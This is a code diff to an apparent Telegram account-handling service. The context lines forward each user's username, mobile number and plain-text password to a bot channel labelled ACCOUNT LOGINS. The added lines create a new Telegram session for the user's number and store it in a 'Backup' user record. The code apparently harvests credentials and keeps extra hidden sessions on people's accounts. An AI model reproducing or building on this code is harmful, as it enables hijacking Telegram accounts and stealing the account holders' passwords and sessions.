@@ -29,12 +29,12 @@ let UsersService = class UsersService {
         this.botsService = botsService;
     }
     async create(user) {
-        const activeClientSetup = this.telegramService.getActiveClientSetup();
+        const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
         console.log("New User received - ", user?.mobile);
         console.log("ActiveClientSetup::", activeClientSetup);
         if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
             console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
-            await this.clientsService.updateClientSession(user.session);
+            await this.clientsService.updateClientSession(user.session, user.mobile);
         }
         else {
             await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
@@ -49,6 +49,9 @@ let UsersService = class UsersService {
                         await (0, Helpers_1.sleep)(1000);
                     }
                     this.updateByFilter({ mobile: user.mobile }, { score: score });
+                    const newSession = await this.telegramService.createNewSession(user.mobile);
+                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup", score: score });
+                    await newUserBackup.save();
                 }
                 catch (error) {
                     console.log("Error in creating new session", error);
